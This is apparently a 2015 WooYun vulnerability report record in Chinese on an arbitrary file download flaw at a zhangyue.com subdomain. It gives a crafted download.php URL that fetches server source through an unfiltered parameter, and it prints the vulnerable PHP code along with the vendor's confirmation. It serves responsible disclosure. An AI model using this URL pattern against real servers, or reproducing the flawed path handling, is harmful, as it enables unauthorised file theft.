{"id": 35752, "wybug_id": "wooyun-2015-0103261", "wybug_title": "掌阅某分站任意文件下载一枚", "wybug_corp": "zhangyue.com", "wybug_author": "sco4x0", "wybug_date": "2015-03-24 10:19", "wybug_open_date": "2015-05-08 10:44", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件遍历下载", "参数未过滤"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-08：\t细节向公众公开  简要描述： 掌阅脑残粉，再来一发 详细说明：  在http://360.zhangyue.com/zybook/u/p/book.php?key=4B4%27#id4 这个地方一不小心点了一本书，然后就发现直接下载了。查看源码发现下载方法在Js中：\nfunction download(bookName,book) {\turl = 'http://360.zhangyue.com/zybook/iReader/u/s/download/'+bookName+\"?f=iReader&name=\" + decodeURI(book) + \"&360ext=apk\";\twindow.location.href = url;\t\t//window.location.href = \"http://360.zhangyue.com/zybook/iReader/u/p/download.php?f=iReader&name=\" + decodeURI(bookName) + \"&360ext=apk\" + \"&download_file=\" + bookName + \".apk\";}\n直觉告诉我，应该有任意文件下载。。。构造一条url，下载download.phphttp://360.zhangyue.com/zybook/iReader/u/p/download.php?f=iReader&name=download.php&360ext=&download_file=download.php果然下载下来了，看看download.php的源码：\n<?phpini_set('display_errors',0);$bookName = $_GET['fn'];if(!$bookName){\texit(0);}//禁止非法下载if(strpos('/', $bookName) !== false){\texit(0);}header(\"Content-type: application/octet-stream\");$bookName = \"《{$bookName}》.apk\";//处理中文文件名if (strpos($_SERVER[\"HTTP_USER_AGENT\"],\"MSIE\") === false){    header('Content-Disposition: attachment; filename=\"' . ($bookName) . '\"');}else{    header('Content-Disposition: attachment; filename=\"' . rawurlencode($bookName) . '\"');}$file = iconv(\"UTF-8\", \"GB2312\",$bookName);//让Xsendfile发送文件header(\"X-Sendfile: {$file}\");\n再下载一个看看\n\n   漏洞证明：  \n\n   修复方案：     版权声明：转载请注明来源 sco4x0@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-03-24 10:43 厂商回复： 非常感谢对掌阅安全的关注，已通知研发同事修复处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-24 10:55 |    \t\tsco4x0 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        | O_o)\t\t \n  @北京掌中浩阅科技有限公司 刚通过你们就确认了，赞！！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}